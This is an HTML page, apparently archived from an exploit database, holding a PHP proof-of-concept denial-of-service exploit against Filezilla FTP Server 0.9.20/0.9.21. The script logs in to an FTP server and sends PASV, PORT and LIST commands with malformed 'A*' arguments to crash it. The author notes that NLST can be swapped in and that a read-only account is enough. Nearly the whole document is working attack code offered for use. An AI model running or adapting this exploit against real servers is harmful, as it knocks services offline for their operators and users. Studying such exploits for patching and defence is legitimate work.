<html><head><title>Filezilla FTP Server <= 0.9.21 (LIST/NLST) Denial of Service Exploit</title></head><pre>&lt;?php

# Filezilla FTP Server 0.9.20 beta / 0.9.21 &quot;LIST&quot;, &quot;NLST&quot; and &quot;NLST -al&quot; Denial Of Service
# by shinnai
# mail: shinnai[at]autistici[dot[org]
# site: http://shinnai.altervista.org
#
# special thanks to rgod for his first advisory about &quot;STOR&quot; Denial of service, see: http://retrogod.altervista.org/filezilla_0921_dos.html
# and for code in php I never could write alone ;)
# This one works fine also with an user with only read and list permissions enabled
# you can change the LIST command also with NLST or NLST -al comamnds

# tested on Windows XP Professional SP2 all patched

error_reporting(E_ALL);

$service_port = getservbyname('ftp', 'tcp');
$address = gethostbyname('127.0.0.1');

$user=&quot;test&quot;;
$pass=&quot;test&quot;;

$junk.=&quot;A*&quot;;

$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
if ($socket &lt; 0) {
  echo &quot;socket_create() failed:\n reason: &quot; . socket_strerror($socket) . &quot;\n&quot;;
} else {
  echo &quot;OK.\n&quot;;
}

$result = socket_connect($socket, $address, $service_port);
if ($result &lt; 0) {
  echo &quot;socket_connect() failed:\n reason: ($result) &quot; . socket_strerror($result) . &quot;\n&quot;;
} else {
  echo &quot;OK.\n&quot;;
}

$out=socket_read($socket, 240);
echo $out;

$in = &quot;USER &quot;.$user.&quot;\r\n&quot;;
socket_write($socket, $in, strlen ($in));

$out=socket_read($socket, 80);
echo $out;

$in = &quot;PASS &quot;.$pass.&quot;\r\n&quot;;
socket_write($socket, $in, strlen ($in));

$out=socket_read($socket, 80);
echo $out;

$in = &quot;PASV &quot;.$junk.&quot;\r\n&quot;;
socket_write($socket, $in, strlen ($in));

$in = &quot;PORT &quot;.$junk.&quot;\r\n&quot;;
socket_write($socket, $in, strlen ($in));

$in = &quot;LIST &quot;.$junk.&quot;\r\n&quot;;
socket_write($socket, $in, strlen ($in));

socket_close($socket);

?&gt;

# milw0rm.com [2006-12-11]</pre></html>